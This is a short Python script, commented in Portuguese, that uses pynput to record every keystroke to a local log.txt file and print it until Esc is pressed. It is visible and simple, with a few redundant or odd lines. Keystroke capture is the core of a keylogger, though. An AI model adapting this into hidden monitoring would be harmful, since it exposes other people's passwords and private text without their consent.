from pynput import keyboard


def copy_paste(k):
    try:
        with open('log.txt', 'a') as log:
            log.write(f'{k}\n')
    except:
        with open('log.txt', 'a') as log:
            log.write(f'{k}\n')


def on_press(key, injected):
    try:
        log_on = f"tecla alfanumerica {key.char} pressionada; isso foi {'falso' if injected else 'verdadeiro'}"
        print(log_on)
        copy_paste(key)
    except AttributeError:
        print(f'Tecla especial {key} pressionada')
        copy_paste(key)


def on_release(key, injected):
    print(f"{key} registrada; isso foi {key, 'falso' if injected else 'verdadeiro'}")
    # encerra gravacao
    if key == keyboard.Key.esc:
        return False

# coleta eventos do teclado
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# inicia gravacao
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

